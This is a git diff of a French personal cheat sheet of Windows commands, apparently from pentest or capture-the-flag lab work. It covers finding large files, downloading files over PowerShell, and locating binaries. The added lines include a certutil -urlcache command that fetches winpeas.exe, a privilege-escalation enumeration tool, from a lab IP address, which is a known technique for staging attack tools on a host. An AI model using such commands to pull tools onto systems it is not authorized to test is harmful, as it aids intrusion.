@@ -290,9 +290,9 @@ allow-hotplug eth0
 - Trouver les fichiers volumineux (en cmd) --> `forfiles /S /M * /C "cmd /C if @fsize GEQ 1073741824 echo @path`
   	- En powershell --> `Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 500MB} | Sort-Object length -Descending | Select-Object Name,Directory,@{n='GB';e={"{0:N2}" -F ($_.length/ 1GB)}}`
  
-- Télécharger des fichiers via powershell : `$url = "http://10.10.16.39:8000/python3.zip"
-$dest = "C:\temp\python.zip"
-Invoke-RestMethod -Uri $url -OutFile $dest`
+- Télécharger des fichiers via powershell :
+	- `$url = "http://10.10.16.39:8000/python3.zip" $dest = "C:\temp\python.zip" Invoke-RestMethod -Uri $url -OutFile $dest`
+	-  `certutil -urlcache -split -f http://10.10.16.28/winpeas.exe winpeas.exe`
 
 - Trouver un binaire précis en powershell --> `Get-ChildItem -Path C:\ -Filter mysql.exe -Recurse -ErrorAction SilentlyContinue`
 
